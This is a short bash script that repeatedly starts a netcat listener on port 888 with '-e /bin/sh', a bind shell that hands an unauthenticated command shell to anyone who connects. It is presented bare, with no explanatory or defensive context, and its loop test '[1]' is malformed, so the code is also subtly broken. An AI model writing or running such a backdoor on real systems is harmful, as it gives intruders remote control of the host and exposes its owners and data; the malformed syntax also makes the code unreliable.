#!/bin/bash
while [1];
do echo "Started";
   nc -l -p 888 -e /bin/sh;
done
